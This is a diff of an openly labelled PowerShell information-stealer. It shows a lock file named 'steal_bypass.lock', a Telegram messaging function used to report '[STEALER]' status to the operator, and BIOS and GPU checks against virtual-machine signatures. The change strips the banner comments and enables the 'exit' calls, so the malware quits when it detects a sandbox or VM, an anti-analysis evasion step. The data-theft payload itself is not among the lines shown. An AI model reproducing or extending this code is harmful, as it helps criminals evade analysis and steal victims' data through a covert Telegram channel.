@@ -72,9 +72,7 @@ function Send-TelegramMessage {
         }
     }
 }
-#╔═══════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
-#║						       LOCK                                                      ║
-#╚═══════════════════════════════════════════════════════════════════════════════════════════════════════════════╝
+
 $lockFilePath = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), "steal_bypass.lock")
 if (Test-Path -Path $lockFilePath) {
     $message = "$($redExclamation) [STEALER] Bypass already running"
@@ -82,9 +80,7 @@ if (Test-Path -Path $lockFilePath) {
 	#exit
 }
 New-Item -Path $lockFilePath -ItemType File -Force
-#╔═══════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
-#║						      ANTI VM                                                    ║
-#╚═══════════════════════════════════════════════════════════════════════════════════════════════════════════════╝
+
 $virtualBiosSignatures = @(
     "VMware",
     "HOXKO3",
@@ -118,7 +114,7 @@ foreach ($bios in $biosInfo) {
 			$message = "$($redExclamation) [STEALER] VM DETECTED (BIOS) [ ! ]"
 			Send-TelegramMessage -message $message
 			Remove-Item -Path $lockFilePath
-			#exit
+			exit
         }
     }
 }
@@ -130,7 +126,7 @@ foreach ($gpu in $gpuInfo) {
 			$message = "$($redExclamation) [STEALER] VM DETECTED (GPU) [ ! ]"
 			Send-TelegramMessage -message $message
 			Remove-Item -Path $lockFilePath
-			#exit
+			exit
         }
     }
 }
